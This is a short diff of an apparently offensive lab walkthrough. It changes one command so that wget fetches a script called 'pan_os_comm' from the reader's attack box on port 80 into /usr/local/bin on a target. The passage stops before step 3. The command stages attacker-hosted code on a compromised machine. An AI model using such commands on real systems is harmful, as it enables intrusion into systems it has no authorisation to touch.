@@ -325,7 +325,7 @@ ls
 
 2. Next, import the `pan_os_comm` script from your attack machine, where it is being hosted via the web server.
    ```bash
-      wget -O /usr/local/bin/pan_os_comm http://<IP_of_your_attack_box>:<port>/pan_os_comm
+      wget -O /usr/local/bin/pan_os_comm http://<IP_of_your_attack_box>:80/pan_os_comm
    ```
 
 3. Once created, run the following command:
